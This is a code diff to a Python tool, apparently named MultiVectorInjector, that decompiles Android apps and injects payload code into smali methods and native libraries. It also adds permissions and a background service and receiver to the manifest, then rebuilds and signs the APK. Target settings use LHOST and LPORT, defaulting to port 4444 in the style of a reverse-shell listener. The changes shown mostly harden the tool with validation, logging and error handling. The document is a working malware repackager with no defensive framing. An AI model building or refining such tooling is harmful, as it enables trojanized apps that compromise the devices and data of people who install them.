@@ -8,6 +8,8 @@ import struct
 import random
 import string
 import hashlib
+import logging
+import gc
 from pathlib import Path
 from typing import Dict, List, Optional, Set, Tuple, Any
 from dataclasses import dataclass
@@ -15,6 +17,62 @@ from datetime import datetime
 import xml.etree.ElementTree as ET
 import json
 import base64
+from contextlib import contextmanager
+
+# Import environment manager
+try:
+    from environment_manager import EnvironmentManager
+except ImportError:
+    # Fallback if environment_manager is not available
+    class EnvironmentManager:
+        @staticmethod
+        def get_lhost() -> str:
+            return os.environ.get('LHOST', '127.0.0.1')
+        
+        @staticmethod
+        def get_lport() -> str:
+            return os.environ.get('LPORT', '4444')
+
+# Import error handler
+try:
+    from error_handler import ErrorHandler, InjectionError, ValidationError, FileOperationError
+except ImportError:
+    # Fallback if error_handler is not available
+    class ErrorHandler:
+        @staticmethod
+        def run_command(cmd: List[str], timeout: int = 300, cwd: Optional[Path] = None) -> Tuple[bool, str]:
+            try:
+                proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout, cwd=cwd)
+                ok = proc.returncode == 0
+                out = (proc.stdout + "\n" + proc.stderr).strip()
+                return ok, out
+            except Exception as e:
+                return False, str(e)
+    
+    class InjectionError(Exception):
+        pass
+    
+    class ValidationError(Exception):
+        pass
+    
+    class FileOperationError(Exception):
+        pass
+
+# Import file manager
+try:
+    from file_manager import FileManager
+except ImportError:
+    # Fallback if file_manager is not available
+    class FileManager:
+        @staticmethod
+        def safe_read_text(file_path: Path, encoding: str = 'utf-8') -> str:
+            return file_path.read_text(encoding=encoding)
+        
+        @staticmethod
+        def safe_write_text(file_path: Path, content: str, encoding: str = 'utf-8') -> None:
+            file_path.parent.mkdir(parents=True, exist_ok=True)
+            file_path.write_text(content, encoding=encoding)
+
 try:
     from PIL import Image  # type: ignore
     _HAVE_PIL = True
@@ -589,17 +647,49 @@ class MultiVectorInjector:
         self.workspace = workspace_dir
         self.smali_generator = SmaliCodeGenerator()
         self.native_generator = NativeLibraryGenerator()
+        
+        # Initialize managers
+        self.env_manager = EnvironmentManager()
+        self.error_handler = ErrorHandler()
+        self.file_manager = FileManager()
+        self.logger = logging.getLogger(__name__)
+        
         # Tooling and flags
         self.enable_apksigner = os.environ.get("ENABLE_APKSIGNER", "false").lower() == "true"
-        self.tools_dir = Path("/workspace/tools/android-sdk")
-        self.apktool_jar = Path("/workspace/tools/apktool/apktool.jar")
+        
+        # Get tool paths from environment manager
+        tool_paths = self.env_manager.get_tool_paths()
+        self.tools_dir = tool_paths['android_sdk'] or Path("/workspace/tools/android-sdk")
+        self.apktool_jar = tool_paths['apktool_jar'] or Path("/workspace/tools/apktool/apktool.jar")
         self.zipalign = self._prefer_tool("zipalign")
         self.apksigner = self._prefer_tool("apksigner")
         self.aapt = self._prefer_tool("aapt")
         self.aapt2 = self._prefer_tool("aapt2")
+        
         # Diagnostics of last failing step
         self.last_error: str = ""
         self.debug_keystore = Path("/workspace/debug.keystore")
+        
+        # Validate environment on initialization
+        self._validate_environment()
+    
+    def _validate_environment(self) -> None:
+        """Validate environment and dependencies"""
+        try:
+            validation_results = self.env_manager.validate_environment()
+            missing_items = [k for k, v in validation_results.items() if not v]
+            
+            if missing_items:
+                self.logger.warning(f"Missing dependencies: {missing_items}")
+                self.last_error = f"Environment validation failed: {missing_items}"
+            
+            # Validate workspace directory
+            if not self.error_handler.validate_directory_path(self.workspace, must_exist=True, must_be_writable=True):
+                raise ValidationError(f"Workspace directory is not accessible: {self.workspace}")
+                
+        except Exception as e:
+            self.logger.error(f"Environment validation error: {e}")
+            self.last_error = str(e)
     
     def _prefer_tool(self, name: str) -> Optional[str]:
         repo_path = self.tools_dir / name
@@ -609,13 +699,8 @@ class MultiVectorInjector:
         return sys_path
     
     def _run(self, cmd: List[str], timeout: int = 300) -> Tuple[bool, str]:
-        try:
-            proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout)
-            ok = proc.returncode == 0
-            out = (proc.stdout + "\n" + proc.stderr).strip()
-            return ok, out
-        except Exception as e:
-            return False, str(e)
+        """Run command with comprehensive error handling"""
+        return ErrorHandler.run_command(cmd, timeout)
     
     def _ensure_debug_keystore(self) -> bool:
         if self.debug_keystore.exists():
@@ -765,9 +850,56 @@ class MultiVectorInjector:
         
         return injection_points
     
+    def validate_target_config(self, target_config: Dict[str, Any]) -> bool:
+        """Validate target configuration parameters"""
+        try:
+            required_fields = ['lhost', 'lport']
+            for field in required_fields:
+                if field not in target_config:
+                    raise ValidationError(f"Missing required field: {field}")
+            
+            # Validate IP address format
+            lhost = target_config['lhost']
+            if not self._is_valid_ip(lhost):
+                raise ValidationError(f"Invalid IP address: {lhost}")
+            
+            # Validate port number
+            try:
+                lport = int(target_config['lport'])
+                if not (1 <= lport <= 65535):
+                    raise ValidationError(f"Invalid port number: {lport}")
+            except (ValueError, TypeError):
+                raise ValidationError(f"Invalid port: {target_config['lport']}")
+            
+            return True
+        except Exception as e:
+            self.logger.error(f"Target config validation error: {e}")
+            return False
+    
+    def _is_valid_ip(self, ip: str) -> bool:
+        """Check if IP address is valid"""
+        try:
+            parts = ip.split('.')
+            if len(parts) != 4:
+                return False
+            for part in parts:
+                if not 0 <= int(part) <= 255:
+                    return False
+            return True
+        except (ValueError, AttributeError):
+            return False
+    
     def create_injection_strategy(self, injection_points: List[InjectionPoint], 
                                  target_config: Dict[str, Any]) -> InjectionStrategy:
         """Create comprehensive injection strategy"""
+        
+        # Validate target configuration
+        if not self.validate_target_config(target_config):
+            raise ValidationError("Invalid target configuration")
+        
+        # Validate injection points
+        if not injection_points:
+            raise ValidationError("No injection points provided")
         
         # Select top injection points
         selected_points = injection_points[:3]  # Use top 3 points
@@ -839,57 +971,100 @@ class MultiVectorInjector:
             success_probability=success_probability
         )
     
+    def get_environment_info(self) -> Dict[str, Any]:
+        """Get current environment information"""
+        return {
+            'workspace': str(self.workspace),
+            'tools_available': {
+                'apktool': self.apktool_jar.exists() if self.apktool_jar else False,
+                'zipalign': bool(self.zipalign),
+                'apksigner': bool(self.apksigner),
+                'aapt': bool(self.aapt),
+                'aapt2': bool(self.aapt2)
+            },
+            'environment_vars': self.env_manager.get_environment_info(),
+            'last_error': self.last_error
+        }
+    
     def inject_payload(self, apk_path: Path, output_path: Path, 
                       injection_strategy: InjectionStrategy, sign_config: Optional[Dict[str, str]] = None) -> bool:
-        """Execute multi-vector payload injection"""
+        """Execute multi-vector payload injection with improved resource management"""
         
-        try:
-            # Create temporary workspace
-            temp_dir = self.workspace / f"injection_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
-            temp_dir.mkdir(exist_ok=True)
-            
-            # Extract APK
-            extract_dir = temp_dir / "extracted"
-            self._extract_apk(apk_path, extract_dir)
-            
-            # Inject into each vector
-            for injection_point in injection_strategy.injection_points:
-                success = self._inject_at_point(extract_dir, injection_point, injection_strategy)
-                if not success:
-                    print(f"Injection failed at point: {injection_point.location_type}:{injection_point.target_name}")
-            
-            # Add required permissions and components
-            self._add_required_permissions(extract_dir, injection_strategy)
-            self._add_manifest_components(extract_dir, injection_strategy)
-            
-            # Recompile + align + sign
-            success = self._recompile_apk(extract_dir, output_path, sign_config or {})
-            
-            # Cleanup temp dir (best-effort)
-            try:
-                shutil.rmtree(temp_dir, ignore_errors=True)
-            except Exception:
-                pass
-            
-            return success
-        except Exception as e:
-            print(f"Error in inject_payload: {e}")
+        # Validate input parameters
+        if not self.error_handler.validate_file_path(apk_path, must_exist=True):
+            self.logger.error(f"APK file not found: {apk_path}")
             return False
+        
+        # Use context manager for temporary workspace
+        with self.file_manager.temporary_workspace() as temp_dir:
+            try:
+                self.logger.info(f"Starting payload injection for {apk_path}")
+                
+                # Extract APK
+                extract_dir = temp_dir / "extracted"
+                self._extract_apk(apk_path, extract_dir)
+                
+                # Inject into each vector
+                injection_errors = []
+                for injection_point in injection_strategy.injection_points:
+                    success = self._inject_at_point(extract_dir, injection_point, injection_strategy)
+                    if not success:
+                        error_msg = f"Injection failed at point: {injection_point.location_type}:{injection_point.target_name}"
+                        self.logger.warning(error_msg)
+                        injection_errors.append(error_msg)
+                
+                # Add required permissions and components
+                self._add_required_permissions(extract_dir, injection_strategy)
+                self._add_manifest_components(extract_dir, injection_strategy)
+                
+                # Recompile + align + sign
+                success = self._recompile_apk(extract_dir, output_path, sign_config or {})
+                
+                if success:
+                    self.logger.info(f"Payload injection completed successfully: {output_path}")
+                else:
+                    self.logger.error(f"Payload injection failed: {self.last_error}")
+                
+                # Log injection errors if any
+                if injection_errors:
+                    self.logger.warning(f"Injection errors: {injection_errors}")
+                
+                return success
+                
+            except Exception as e:
+                self.error_handler.log_error_with_context(e, "inject_payload", {
+                    'apk_path': str(apk_path),
+                    'output_path': str(output_path),
+                    'strategy_name': injection_strategy.strategy_name
+                })
+                self.last_error = str(e)
+                return False
+            finally:
+                # Cleanup large objects
+                self.file_manager.cleanup_large_objects()
     
     def _extract_apk(self, apk_path: Path, extract_dir: Path):
         """Extract APK using apktool"""
+        # Validate input file
+        if not self.error_handler.validate_file_path(apk_path, must_exist=True):
+            raise FileOperationError(f"APK file not found or not accessible: {apk_path}")
+        
+        # Validate output directory
+        if not self.error_handler.validate_directory_path(extract_dir, must_exist=False, must_be_writable=True):
+            raise FileOperationError(f"Extract directory not writable: {extract_dir}")
+        
         apktool_path = str(self.apktool_jar)
         if not Path(apktool_path).exists():
-            raise Exception("Apktool not found")
+            raise FileOperationError("Apktool not found")
         
         cmd = [
             "java", "-jar", apktool_path, "d", 
             str(apk_path), "-o", str(extract_dir), "-f"
         ]
         
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
-        if result.returncode != 0:
-            raise Exception(f"APK extraction failed: {result.stderr}")
+        ok, output = self._run(cmd, timeout=300)
+        if not ok:
+            raise InjectionError(f"APK extraction failed: {output}")
     
     def _inject_at_point(self, extract_dir: Path, injection_point: InjectionPoint, 
                         strategy: InjectionStrategy) -> bool:
@@ -929,8 +1104,12 @@ class MultiVectorInjector:
             print(f"Target smali file not found: {injection_point.target_name}")
             return False
         
-        # Read existing content
-        content = target_file.read_text()
+        # Read existing content safely
+        try:
+            content = self.file_manager.safe_read_text(target_file)
+        except Exception as e:
+            self.logger.error(f"Error reading target file {target_file}: {e}")
+            return False
         
         # Find injection point in method
         if injection_point.method_name:
@@ -966,8 +1145,12 @@ class MultiVectorInjector:
                 if payload_code:
                     # Inject payload code
                     new_content = content[:method_start] + payload_code + content[method_start:]
-                    target_file.write_text(new_content)
-                    return True
+                    try:
+                        self.file_manager.safe_write_text(target_file, new_content)
+                        return True
+                    except Exception as e:
+                        self.logger.error(f"Error writing to target file {target_file}: {e}")
+                        return False
         
         return False
     
@@ -994,11 +1177,19 @@ class MultiVectorInjector:
             
             # Create native library source
             c_file = lib_dir / "payload.c"
-            c_file.write_text(native_component.code_content)
+            try:
+                self.file_manager.safe_write_text(c_file, native_component.code_content)
+            except Exception as e:
+                self.logger.error(f"Error writing C file {c_file}: {e}")
+                continue
             
             # Create Makefile
             makefile = lib_dir / "Makefile"
-            makefile.write_text(self.native_generator.generate_makefile(arch))
+            try:
+                self.file_manager.safe_write_text(makefile, self.native_generator.generate_makefile(arch))
+            except Exception as e:
+                self.logger.error(f"Error writing Makefile {makefile}: {e}")
+                continue
             
             # Compile (if cross-compiler available)
             try:
@@ -1028,7 +1219,11 @@ class MultiVectorInjector:
         if not manifest_file.exists():
             return
         
-        content = manifest_file.read_text()
+        try:
+            content = self.file_manager.safe_read_text(manifest_file)
+        except Exception as e:
+            self.logger.error(f"Error reading manifest file {manifest_file}: {e}")
+            return
         
         # Collect all required permissions
         all_permissions = set()
@@ -1041,7 +1236,10 @@ class MultiVectorInjector:
             if permission not in content:
                 content = content.replace('</manifest>', permission_line + '</manifest>')
         
-        manifest_file.write_text(content)
+        try:
+            self.file_manager.safe_write_text(manifest_file, content)
+        except Exception as e:
+            self.logger.error(f"Error writing manifest file {manifest_file}: {e}")
     
     def _add_manifest_components(self, extract_dir: Path, strategy: InjectionStrategy):
         """Add new components to AndroidManifest.xml"""
@@ -1050,7 +1248,11 @@ class MultiVectorInjector:
         if not manifest_file.exists():
             return
         
-        content = manifest_file.read_text()
+        try:
+            content = self.file_manager.safe_read_text(manifest_file)
+        except Exception as e:
+            self.logger.error(f"Error reading manifest file {manifest_file}: {e}")
+            return
         
         # Add service component
         service_xml = '''        <service
@@ -1081,7 +1283,10 @@ class MultiVectorInjector:
                 new_content = (content[:app_end] + 
                              service_xml + receiver_xml + 
                              content[app_end:])
-                manifest_file.write_text(new_content)
+                try:
+                    self.file_manager.safe_write_text(manifest_file, new_content)
+                except Exception as e:
+                    self.logger.error(f"Error writing manifest file {manifest_file}: {e}")
     
     def _recompile_apk(self, extract_dir: Path, output_path: Path, sign_cfg: Optional[Dict[str, str]] = None) -> bool:
         """Recompile APK using apktool, then zipalign and sign (apksigner if enabled, else jarsigner)."""
